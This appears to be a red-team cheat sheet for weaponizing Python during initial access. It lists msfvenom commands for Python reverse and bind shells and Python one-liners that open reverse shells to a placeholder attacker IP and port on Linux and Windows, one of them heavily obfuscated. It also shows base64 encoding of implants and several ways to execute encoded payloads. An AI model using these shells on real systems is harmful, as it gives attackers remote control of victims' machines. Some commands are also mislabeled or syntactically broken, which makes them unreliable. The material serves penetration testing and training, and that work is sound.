---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - cross-platform
  - python
---
# Python

## 01 - Base64 Encoded

Encode the python implant.

```
$ basenc -w 0 --base64 implant.py

$ base64 -w 0 implant.py

$ openssl enc -a -e -A -in implant.py

$ openssl enc -base64 -A -in implant.py
```

## 02 - Python Implants

### 2.1 - Cross Platform

##### 2.1.1 - Generate via `msfvenom`

###### 2.1.1.1 - Reverse Shells

Stageless TCP reverse shell.

```
$ msfvenom -p python/shell_reverse_tcp lhost=<IP> lport=<PORT> -o shell.py

$ msfvenom -p python/shell_reverse_tcp_ssl lhost=<IP> lport=<PORT> -o shell.py
```

Stageless UDP reverse shell.

```
$ msfvenom -p python/shell_reverse_udp lhost=<IP> lport=<PORT> -o shell.py
```

Staged TCP reverse shell.

```
$ msfvenom -p python/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -o implant.py

$ msfvenom -p python/meterpreter/reverse_tcp_ssl lhost=<IP> lport=<PORT> -o implant.py
```

Stageless HTTP reverse shell.

```
$ msfvenom -p python/meterpreter_reverse_http lhost=<IP> lport=<PORT> -o implant.py
```

Staged HTTP reverse shell.

```
$ msfvenom -p python/meterpreter/reverse_http lhost=<IP> lport=<PORT> -o implant.py
```

Stageless HTTP via TLS reverse shell.

```
$ msfvenom -p python/meterpreter_reverse_https handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o implant.py
```

Staged HTTP via TLS reverse shell.

```
$ msfvenom -p python/meterpreter/reverse_https handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o implant.py
```

###### 2.1.1.2 - Bind Shells

```
$ msfvenom -p python/shell_bind_tcp lport=<PORT> -o shell.py
```

##### 2.1.2 - One-liners

###### 2.1.1.2 - Bind Shell

```
> python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

### 2.2 - Linux

#### 2.2.1 - Reverse Shells

##### 2.2.1.1 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_python lhost=<IP> lport=<PORT>

$ msfvenom -p cmd/unix/reverse_python_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

##### 2.2.1.2 - One-liners

###### 2.2.1.2.1 - IPv4

First variant.

```
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

Second variant.

```
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Third variant that works with [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Shell Handler/Cross Platform/Manual/Netcat Variants/Socat|socat]] listener.

```
$ python -c 'import sys,socket,os,pty;s=socket.socket(); s.connect((os.getenv("<IP>"),int(os.getenv("<PORT>")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/sh")'
```

###### 2.2.1.2.2 - IPv6

```
$ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<IPv6>",<PORT>,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

#### 2.2.2 - Bind Shells

##### 2.2.2.2 - One-liners

###### 2.2.2.2.1 - IPv4

```
$ export RHOST="<IP>";export RPORT=<PORT>; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("$RHOST"),int(os.getenv("$RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

### 2.3 - Windows

#### 2.3.1 - Reverse Shells

##### 2.3.1.2 - One-liners

###### 2.3.1.2.1 - IPv4

```
C:\> python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('<IP>', <PORT>)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

## 03 - Execute Implant

> [!TIP]
> On windows, you can combine with a enumeration function to check one of the [[Compilers|compilers]] exist in order to execute the implant especially when the target is windows.

### 3.1 - Cross Platform

Single quote

```
> python -c 'exec "<base64_payload>".decode("base64")'
```

Double quote

```
> python -c "exec '<base64_payload>'.decode('base64')"

> python -c "exec( __import__('base64').decodestring('<base64_payload>'))"

> python -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b, 'UTF-8')}[sys.version_info[0]]('<base64_payload>')))"
```

One-line Base64 (ANSI-C Quoting)

```
> python -c $'exec \'<base64_payload>\'.decode(\'base64\')'
```

One-line Base64

```
> python -c "exec \"<base64_payload>\".decode(\"base64\")"
```

### 3.2 - Linux

Single quote

```
$ echo "exec('<base64_payload>').decode('base64')) | python"
```

Heredoc Base64

```
$ python - << EOF
exec '<base64_payload>'.decode('base64')
EOF

$ python - << EOF
exec "<base64_payload>".decode("base64")
EOF
```

---
## References

### GTFOBins

- [GTFOBins: Python](https://gtfobins.github.io/gtfobins/python/)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)

### don't code me on that

- [don't code me on that: Python Reverse Shells](https://medium.com/dont-code-me-on-that/bunch-of-shells-python-b3fb1400b823)

### PuckieStyle

- [PuckieStyle: Python one-line b64 Shellcode](https://www.puckiestyle.nl/python-one-line-shellcode/)

### Pentest Monkey

- [Reverse Shell Cheatsheet Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)